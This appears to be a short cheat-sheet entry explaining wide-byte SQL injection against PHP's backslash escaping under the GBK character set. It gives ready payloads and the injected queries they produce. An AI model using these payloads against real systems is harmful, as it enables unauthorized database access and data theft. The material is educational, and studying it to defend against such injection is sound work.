Payload: `admin乗' OR 1=1 -- 乗'`

Here's a breakdown of how the wide byte injection works:

For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.

However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.

In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for SQL injection.

Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.